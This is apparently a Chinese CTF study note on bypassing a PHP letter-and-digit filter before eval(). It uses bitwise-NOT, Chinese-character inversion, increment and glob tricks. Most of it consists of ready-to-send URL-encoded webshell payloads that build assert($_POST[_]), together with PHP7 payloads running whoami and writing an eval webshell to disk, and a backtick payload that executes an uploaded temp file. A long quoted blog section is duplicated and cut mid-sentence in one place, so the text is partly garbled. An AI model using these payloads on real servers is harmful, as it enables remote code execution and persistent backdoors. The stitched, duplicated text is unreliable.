# 核心代码


```php
<?php
highlight_file(__FILE__);
$code = $_GET['code'];
if(preg_match("/[A-Za-z0-9]+/",$code)){
    die("hacker!");
}
@eval($code);
?>

```

说白了还是绕preg_match

# 异或

详见preg_match绕过

# 取反

取反也是php中的一种运算符，关于取反的具体规则可以参考这篇文章：[https://blog.csdn.net/WilliamsWayne/article/details/78259501](https://blog.csdn.net/WilliamsWayne/article/details/78259501)，写得挺详细的，取反的好处就是，它每一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。

方法一

首先，我们想要构造的依然是`assert($_POST[_])`这条语句，和上面一样，我们先用`php`的取反符号`~`将字符串`assert`和`_POST`取反，这里需要注意的是，由于它取反之后会有大量不可显字符，所以我们同样需要将其url编码，然后当我们要用的时候，再利用取反符号把它们取回来即可，具体请见下图：

![](https://img2020.cnblogs.com/blog/2541080/202110/2541080-20211013201511542-689493594.png)

 可以看到，`assert`的取反结果是`%9E%8C%8C%9A%8D%8B`，`_POST`的取反结果是`%A0%AF%B0%AC%AB`，那我们就开始构造：


```
$_=~(%9E%8C%8C%9A%8D%8B);    //这里利用取反符号把它取回来，$_=assert
$__=~(%A0%AF%B0%AC%AB);      //$__=_POST
$___=$$__;                   //$___=$_POST
$_($___[_]);                 //assert($_POST[_]);
放到一排就是：
$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);

```

方法二

方法二是我看p神博客才了解到的方法，就是说利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，然后再进行一次取反操作，就能得到一个我们想要的字符，这里的原理我确实是不知道，因为这里好像是涉及到计组知识而我现在还没学，害，现在就只有先学会怎么用，原理后面再补了

![](https://img2020.cnblogs.com/blog/2541080/202110/2541080-20211013201556309-706256064.png)

这里之所以会输出两个相同的`r`，就是因为里面`$_{1}`就是`\x8d`，然后这里对`\x86`进行取反就能得到`r`，原理不详

总之我们需要知道的是，对于一个汉字进行`~($x{0})`或`~($x{1})`或`~($x{2})`的操作，可以得到某个`ascii码`的字符值，我们就可以利用这一点构造出`webshell`



```
$_++;                //得到1，此时$_=1
$__ = "极";
$___ = ~($__{$_});   //得到a，此时$___="a"
$__ = "区";
$___ .= ~($__{$_});   //得到s，此时$___="as"
$___ .= ~($__{$_});   //此时$___="ass"
$__ = "皮";
$___ .= ~($__{$_});   //得到e，此时$___="asse"
$__ = "十";
$___ .= ~($__{$_});   //得到r，此时$___="asser"
$__ = "勺";
$___ .= ~($__{$_});   //得到t，此时$___="assert"
$____ = '_';          //$____='_'
$__ = "寸";
$____ .= ~($__{$_});   //得到P，此时$____="_P"
$__ = "小";
$____ .= ~($__{$_});   //得到O，此时$____="_PO"
$__ = "欠";
$____ .= ~($__{$_});   //得到S，此时$____="_POS"
$__ = "立";
$____ .= ~($__{$_});   //得到T，此时$____="_POST"
$_ = $$____;           //$_ = $_POST
$___($_[_]);           //assert($_POST[_])
放到一排就是：
$_++;$__ = "极";$___ = ~($__{$_});$__ = "区";$___ .= ~($__{$_});$___ .= ~($__{$_});$__ = "皮";$___ .= ~($__{$_});$__ = "十";$___ .= ~($__{$_});$__ = "勺";$___ .= ~($__{$_});$____ = '_';$__ = "寸";$____ .= ~($__{$_});$__ = "小";$____ .= ~($__{$_});$__ = "欠";$____ .= ~($__{$_});$__ = "立";$____ .= ~($__{$_});$_ = $$____;$___($_[_]);


```

由于不可见字符的原因，我们还是要进行url编码之后才能正常使用：

```
%24_%2B%2B%3B%24__%20%3D%20%22%E6%9E%81%22%3B%24___%20%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8C%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%9A%AE%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8D%81%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8B%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24____%20%3D%20'_'%3B%24__%20%3D%20%22%E5%AF%B8%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%B0%8F%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E6%AC%A0%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%AB%8B%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24_%20%3D%20%24%24____%3B%24___(%24_%5B_%5D)%3B

```

# 自增

在处理字符变量的算数运算时，`PHP`沿袭了`Perl`的习惯，而不是C语言的。在C语言中，它递增的是`ASCII值,a = 'Z'; a++;` 将把 `a` 变成 `'['`（`'Z'` 的 ASCII 值是 90，`'['` 的 ASCII 值是 91），而在Perl中， `$a = 'Z'; $a++;` 将把 `$a` 变成`'AA'`。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增或递减其他字符变量则无效，原字符串没有变化。

也就是说，只要我们获得了小写字母`a`，就可以通过自增获得所有小写字母，当我们获得大写字母`A`，就可以获得所有大写字母了

正好，数组(Array)中就正好有大写字母`A`和小写字母`a`，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为`Array`，那取它的第一个子母，就拿到`A`了，那有了`a`和`A`，相当于我们就可以拿到`a-z`和`A-Z`中的所有字母了

![](https://img2020.cnblogs.com/blog/2541080/202110/2541080-20211013203803813-835857335.png)

 这里我就直接给出p神的构造结果了，构造出来很长，而且我感觉也不是特别实用：



```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);


```
放到一排再url编码之后是：

```
%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B'!'%3D%3D'%40'%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D'_'%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B

```
说实话真的太长了，要是稍微有个长度限制就用不了，所以说这种方法只做了解即可

#  php5和php7的区别

在研究无数字字母rce的过程中，一个很重要的函数就是`assert`，但在php5的版本和php7的版本中，它是有一些区别的，我们上面的测试都是基于php5进行的，在php5中assert是一个函数，我们可以通过`$f='assert';$f(...);`这样的方法来动态执行任意代码，在php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，但是在php7中，我们可以使用($a)()这种方法来执行命令，那相当于我们对phpinfo取反后就可以直接执行了，也可以选择file_put_contents()来写入shell，在php5中这样是不行的：

![](https://img2020.cnblogs.com/blog/2541080/202110/2541080-20211013203950659-1076734112.png)

###  例子一

在php7中，因为可以使用($a)()这种方法来执行命令，所以说我们利用`call_user_func()`来举例，`(call_user_func)(system,whoami,'')`即可执行`whoami`的命令：

![](https://img2020.cnblogs.com/blog/2541080/202110/2541080-20211013204014313-712260497.png)

_那构造出来的结果就为：_

(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,'');

### 例子二

再来一个在php7中利用`file_put_contents()`写入`shell`的例子：

![](https://img2020.cnblogs.com/blog/2541080/202110/2541080-20211013204058114-20364920.png)

 我们要构造的语句为：`file_put_contents('4.php','<?php eval(\$_POST[1]);');`构造出来就为：

(~(%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C))(~(%CB%D1%8F%97%8F),~(%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));

这里要注意的就是要有该目录的写入权限哈

这里就引出了我们下一个问题，当php5版本无法($a)();
而且限制长度，无数字字母命令执行，该怎么做？
# php5 无数字字母限制长度命令执行


大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。

PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？

## [PHP5+shell打破禁锢](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell)

因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、`$`的系统命令来getshell？

好像问题又回到了原点：无字母、数字、`$`，在shell中仍然是一个难题。

此时我想到了两个有趣的Linux shell知识点：

1. shell下可以利用`.`来执行任意脚本
2. Linux文件名支持用glob通配符代替

第一点曾在《 [小密圈里的那些奇技淫巧](https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html) 》露出过一角，但我没细讲。`.`或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则`. file`的意思就是用bash执行file文件中的命令。

用`. file`执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用`.`来执行它了吗？

这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母。

第二个难题接踵而至，执行`. /tmp/phpXXXXXX`，也是有字母的。此时就可以用到Linux下的glob通配符：

- `*`可以代替0个及以上任意字符
- `?`可以代表1个任意字符

那么，`/tmp/phpXXXXXX`就可以表示为`/*/?????????`或`/???/?????????`。

但我们尝试执行`. /???/?????????`，却得到如下错误：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/19ba62d6-9f8a-40a6-a3f9-833deca218d5.1d1534b39994.png)](https://www.leavesongs.com/media/attachment/2018/10/06/19ba62d6-9f8a-40a6-a3f9-833deca218d5.png)

这是因为，能够匹配上`/???/?????????`这个通配符的文件有很多，我们可以列出来：



可见，我们要执行的`/tmp/phpcjggLC`排在倒数第二位。然而，在执行第一个匹配上的文件（即`/bin/run-parts`）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。

思路又陷入了僵局，虽然方向没错。

## [深入理解glob通配符](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob)

大部分同学对于通配符，可能知道的都只有`*`和`?`。但实际上，阅读Linux的文档（ [http://man7.org/linux/man-pages/man7/glob.7.html](http://man7.org/linux/man-pages/man7/glob.7.html) ），可以学到更多有趣的知识点。

其中，glob支持用`[^x]`的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉`/bin/run-parts`：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/0a5b0800-1a01-4738-831f-f597795255e0.63b17aebf66d.png)](https://www.leavesongs.com/media/attachment/2018/10/06/0a5b0800-1a01-4738-831f-f597795255e0.png)

排除了第4个字符是`-`的文件，同样我们可以排除包含`.`的文件：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/1553332a-76fe-4a0a-a8db-7f1ae410c85c.4bb210f52740.png)](https://www.leavesongs.com/media/attachment/2018/10/06/1553332a-76fe-4a0a-a8db-7f1ae410c85c.png)

现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。

继续阅读glob的帮助，我发现另一个有趣的用法：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.3c485a5bb8eb.png)](https://www.leavesongs.com/media/attachment/2018/10/06/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.png)

就跟正则表达式类似，glob支持利用`[0-9]`来表示一个范围。

我们再来看看之前列出可能干扰我们的文件：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/ee9e5ae9-3937-46a3-8d8e-1f4879913801.f9e468b3ba6e.png)](https://www.leavesongs.com/media/attachment/2018/10/06/ee9e5ae9-3937-46a3-8d8e-1f4879913801.png)

所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。

翻开ascii码表，可见大写字母位于`@`与`[`之间：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png)](https://www.leavesongs.com/media/attachment/2018/10/06/a827f363-7520-4fe9-aac1-b8ceba21a1f3.png)

那么，我们可以利用`[@-[]`来表示大写字母：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png)](https://www.leavesongs.com/media/attachment/2018/10/06/42774646-968e-4e11-b6fa-5d4e83eb3c4c.png)

显然这一招是管用的。

## [构造POC，执行任意命令](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#poc)

当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。

最后，我传入的code为``?><?=`.+/???/????????[@-[]`;?>``，发送数据包如下：

![[Pasted image 20251008213047.png]]](https://www.leavesongs.com/media/attachment/2018/10/06/56de7887-0a22-4b06-9ccd-2951a4bdab4c.png)

成功执行任意命令。
## 以下是p神原文

前几天【[代码审计知识星球](https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html)】里有同学提出了一个问题，大概代码如下：


```php
<?php if(isset($_GET['code'])){     $code = $_GET['code'];     if(strlen($code)>35){         die("Long.");     }     if(preg_match("/[A-Za-z0-9_$]+/",$code)){         die("NO.");     }     eval($code); }else{     highlight_file(__FILE__); }

```
这个代码如果要getshell，怎样利用？

这题可能来自是我曾写过的一篇文章：《[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)》，里面介绍了如何构造无字母数字的webshell。其中有两个主要的思路：

1. 利用位运算
2. 利用自增运算符

当然，这道题多了两个限制：

1. webshell长度不超过35位
2. 除了不包含字母数字，还不能包含`$`和`_`

难点呼之欲出了，我前面文章中给出的所有方法，都用到了PHP中的变量，需要对变量进行变形、异或、取反等操作，最后动态执行函数。但现在，因为`$`不能使用了，所以我们无法构造PHP中的变量。

所以，如何解决这个问题？

### [PHP7 下简单解决问题](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php7)

我们将上述代码放在index.php中，然后执行``docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:7.2-apache``，启动一个php 7.2的服务器。

php7中修改了表达式执行的顺序：[http://php.net/manual/zh/migration70.incompatible.php](http://php.net/manual/zh/migration70.incompatible.php) ：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af.png)](https://www.leavesongs.com/media/attachment/2018/10/06/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.png)

PHP7前是不允许用`($a)();`这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过`('phpinfo')();`来执行函数，第一个括号中可以是任意PHP表达式。

所以很简单了，构造一个可以生成`phpinfo`这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：

`(~%8F%97%8F%96%91%99%90)();`

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/cdd77556-6aec-425b-85e1-207b8eda77c7.d47ebfeb4011.png)](https://www.leavesongs.com/media/attachment/2018/10/06/cdd77556-6aec-425b-85e1-207b8eda77c7.png)

### [PHP5的思考](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5)

我们使用``docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:5.6-apach``来运行一个php5.6的web环境。

此时，我们尝试用PHP7的payload，将会得到一个错误：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/a77b35ae-78dd-4fae-b029-8326edeafff4.d1ac6c4a1c4f.png)](https://www.leavesongs.com/media/attachment/2018/10/06/a77b35ae-78dd-4fae-b029-8326edeafff4.png)

原因就是php5并不支持这种表达方式。

在我在知识星球里发出帖子的时候，其实还没想到如何用PHP5解决问题，但我有自信解决它，所以先发了这个小挑战。后来关上电脑仔细想想，发现当思路禁锢在一个点的时候，你将会钻进牛角尖；当你用大局观来看待问题，问题就迎刃而解。

当然，我觉得我的方法应该不是唯一的，不过一直没人出来公布答案，我就先抛钻引玉了。

大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。

PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？

### [PHP5+shell打破禁锢](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell)

因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、`$`的系统命令来getshell？

好像问题又回到了原点：无字母、数字、`$`，在shell中仍然是一个难题。

此时我想到了两个有趣的Linux shell知识点：

1. shell下可以利用`.`来执行任意脚本
2. Linux文件名支持用glob通配符代替

第一点曾在《 [小密圈里的那些奇技淫巧](https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html) 》露出过一角，但我没细讲。`.`或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则`. file`的意思就是用bash执行file文件中的命令。

用`. file`执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用`.`来执行它了吗？

这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp的大小写字母。

第二个难题接踵而至，执行`. /tmp/phpXXXXXX`，也是有字母的。此时就可以用到Linux下的glob通配符：

- `*`可以代替0个及以上任意字符
- `?`可以代表1个任意字符

那么，`/tmp/phpXXXXXX`就可以表示为`/*/?????????`或`/???/?????????`。

但我们尝试执行`. /???/?????????`，却得到如下错误：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/19ba62d6-9f8a-40a6-a3f9-833deca218d5.1d1534b39994.png)](https://www.leavesongs.com/media/attachment/2018/10/06/19ba62d6-9f8a-40a6-a3f9-833deca218d5.png)

这是因为，能够匹配上`/???/?????????`这个通配符的文件有很多，我们可以列出来：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png)](https://www.leavesongs.com/media/attachment/2018/10/06/67a4aab1-9e90-43e6-b3f1-3569c7009390.png)

可见，我们要执行的`/tmp/phpcjggLC`排在倒数第二位。然而，在执行第一个匹配上的文件（即`/bin/run-parts`）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。

思路又陷入了僵局，虽然方向没错。

### [深入理解glob通配符](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob)

大部分同学对于通配符，可能知道的都只有`*`和`?`。但实际上，阅读Linux的文档（ [http://man7.org/linux/man-pages/man7/glob.7.html](http://man7.org/linux/man-pages/man7/glob.7.html) ），可以学到更多有趣的知识点。

其中，glob支持用`[^x]`的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉`/bin/run-parts`：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/0a5b0800-1a01-4738-831f-f597795255e0.63b17aebf66d.png)](https://www.leavesongs.com/media/attachment/2018/10/06/0a5b0800-1a01-4738-831f-f597795255e0.png)

排除了第4个字符是`-`的文件，同样我们可以排除包含`.`的文件：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/1553332a-76fe-4a0a-a8db-7f1ae410c85c.4bb210f52740.png)](https://www.leavesongs.com/media/attachment/2018/10/06/1553332a-76fe-4a0a-a8db-7f1ae410c85c.png)

现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。

继续阅读glob的帮助，我发现另一个有趣的用法：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.3c485a5bb8eb.png)](https://www.leavesongs.com/media/attachment/2018/10/06/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.png)

就跟正则表达式类似，glob支持利用`[0-9]`来表示一个范围。

我们再来看看之前列出可能干扰我们的文件：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/ee9e5ae9-3937-46a3-8d8e-1f4879913801.f9e468b3ba6e.png)](https://www.leavesongs.com/media/attachment/2018/10/06/ee9e5ae9-3937-46a3-8d8e-1f4879913801.png)

所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。

翻开ascii码表，可见大写字母位于`@`与`[`之间：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png)](https://www.leavesongs.com/media/attachment/2018/10/06/a827f363-7520-4fe9-aac1-b8ceba21a1f3.png)

那么，我们可以利用`[@-[]`来表示大写字母：

[![image.png](https://www.leavesongs.com/media/attachment/2018/10/06/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png)](https://www.leavesongs.com/media/attachment/2018/10/06/42774646-968e-4e11-b6fa-5d4e83eb3c4c.png)

显然这一招是管用的。

### [构造POC，执行任意命令](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#poc)

当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。

最后，我传入的code为``?><?=`. /???/????????[@-[]`;?>``，发送数据包如下：

![[Pasted image 20251022202511.png]]](https://www.leavesongs.com/media/attachment/2018/10/06/56de7887-0a22-4b06-9ccd-2951a4bdab4c.png)

成功执行任意命令。